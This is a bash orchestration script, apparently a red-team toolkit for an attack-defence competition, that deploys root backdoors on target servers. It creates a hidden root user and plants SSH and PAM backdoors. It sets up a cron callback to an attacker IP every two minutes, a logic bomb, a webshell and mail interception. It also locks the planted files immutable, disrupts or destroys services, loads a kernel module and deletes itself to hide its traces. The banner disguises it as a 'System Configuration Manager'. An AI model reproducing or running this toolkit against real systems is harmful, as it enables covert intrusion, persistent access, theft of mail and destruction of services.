#!/usr/bin/env bash
# Usage: ./deploy_attack.sh [deploy|cleanup] [all|persistence|disrupt|destroy|lkm]
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Config ────────────────────────────────────────────────────────────────────
if [[ -z "${ATTACKER_IP:-}" ]]; then
  read -r -p "[?] Attacker IP (172.31.40.1–6): " ATTACKER_IP
  ATTACKER_IP="${ATTACKER_IP:-172.31.40.1}"
fi
if [[ -z "${ATTACKER_PORT:-}" ]]; then
  read -r -p "[?] Listener port (default 4444): " ATTACKER_PORT
  ATTACKER_PORT="${ATTACKER_PORT:-4444}"
fi

# Generate keypair HERE in the master script so 02 and 04 both see the same key.
# If ATTACKER_PUBKEY is already set in the environment, use it as-is.
if [[ -z "${ATTACKER_PUBKEY:-}" ]]; then
  read -r -p "[?] SSH public key (leave blank to generate one): " ATTACKER_PUBKEY
  if [[ -z "${ATTACKER_PUBKEY}" ]]; then
    KEYFILE="/tmp/.svc_key_$(date +%s)"
    ssh-keygen -t ed25519 -f "$KEYFILE" -N "" -C "svc-monitoring" -q
    ATTACKER_PUBKEY="$(cat "${KEYFILE}.pub")"
    echo "[+] Generated SSH keypair — COPY PRIVATE KEY NOW:"
    echo "────────────────────────────────────────"
    cat "$KEYFILE"
    echo "────────────────────────────────────────"
    rm -f "$KEYFILE" "${KEYFILE}.pub"
  fi
fi

if [[ -z "${SHADOW_PASS:-}" ]]; then
  SHADOW_PASS="$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 16 || true)"
fi
if [[ -z "${MAGIC_PASS:-}" ]]; then
  MAGIC_PASS="$(tr -dc 'a-f0-9' < /dev/urandom | head -c 24 || true)"
fi

export ATTACKER_IP ATTACKER_PORT ATTACKER_PUBKEY SHADOW_PASS MAGIC_PASS \
       SHADOW_USER="${SHADOW_USER:-sys.sync}"

ACTION="${1:-deploy}"
MODE="${2:-all}"

# ── Box detection ─────────────────────────────────────────────────────────────
detect_box() {
  if [[ -d /opt/splunk ]]; then echo "splunk"
  elif [[ -f /usr/sbin/postfix ]] || [[ -d /etc/postfix ]]; then echo "mail"
  elif [[ -d /etc/nginx ]] || [[ -d /etc/httpd ]]; then echo "web"
  else echo "unknown"
  fi
}
BOX_TYPE="$(detect_box)"
echo "[*] Detected box type: ${BOX_TYPE}"

run() {
  local script="$1"
  if [[ ! -f "${DIR}/${script}" ]]; then
    echo "[!] ${script} not found — skipping"
    return
  fi
  echo ""
  echo "  ── ${script} ──"
  bash "${DIR}/${script}" "$ACTION" && true || echo "[!] ${script} exited non-zero"
}

# ── Deployment ────────────────────────────────────────────────────────────────
echo ""
echo "══════════════════════════════════════════"
echo "  System Configuration Manager — ${ACTION^^} (${MODE})"
echo "══════════════════════════════════════════"

if [[ "$MODE" == "all" || "$MODE" == "persistence" ]]; then
  # Universal persistence — every box
  run 01_shadow_root.sh
  run 02_ssh_backdoor.sh
  run 03_pam_backdoor.sh
  run 04_restore_service.sh
  run 05_cron_shell.sh
  run 12_logic_bomb.sh

  # Box-specific silent persistence
  case "$BOX_TYPE" in
    web)
      run 10_webshell_p0wny.sh
      ;;
    mail)
      run 10_webshell_p0wny.sh   # Roundcube web root
      run 11_mail_intercept.sh   # Silent content_filter — mail still scores
      ;;
    *) ;;
  esac

  run 06_immutable_sweep.sh   # Always last — locks everything planted above
fi

if [[ "$MODE" == "all" || "$MODE" == "disrupt" ]]; then
  case "$BOX_TYPE" in
    web)    run 07_disrupt_web.sh ;;
    mail)   run 08_disrupt_mail.sh ;;
    splunk) run 09_disrupt_splunk.sh ;;
    *)      echo "[!] Unknown box type — skipping scoring disruption" ;;
  esac
fi

if [[ "$MODE" == "destroy" ]]; then
  case "$BOX_TYPE" in
    web)  run 13_destroy_web.sh ;;
    *)    echo "[!] No destroy script for box type: ${BOX_TYPE}" ;;
  esac
fi

if [[ "$MODE" == "all" || "$MODE" == "lkm" || "$MODE" == "persistence" ]]; then
  echo ""
  echo "  ── lkm/load.sh ──"
  bash "${DIR}/lkm/load.sh" "$ACTION" || echo "[!] LKM step failed"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo "══════════════════════════════════════════"
echo "  SUMMARY"
echo "══════════════════════════════════════════"
if [[ "$ACTION" == "deploy" ]]; then
  echo "  Box type  : ${BOX_TYPE}"
  echo "  Aux user  : ${SHADOW_USER}  pass: ${SHADOW_PASS}"
  echo "  PAM token : ${MAGIC_PASS}"
  echo "  Callback  : ${ATTACKER_IP}:${ATTACKER_PORT} every 2 min"
  echo "  Auth key  : /root/.ssh/authorized_keys (locked)"
  echo "  Resync    : systemd-network-helper.timer (5 min)"
  [[ "$BOX_TYPE" == "web"  ]] && echo "  Status    : http://<target>/health.php"
  [[ "$BOX_TYPE" == "mail" ]] && echo "  Status    : http://<target>/roundcubemail/health.php (or /health.php)"
  [[ "$BOX_TYPE" == "mail" ]] && echo "  Archive   : /usr/local/lib/.locale_cache/"
  echo ""
  # Wipe the toolkit — no trace left on the box
  echo "[*] Wiping attack toolkit from disk..."
  (sleep 1 && rm -rf -- "${DIR}") &
fi
echo ""
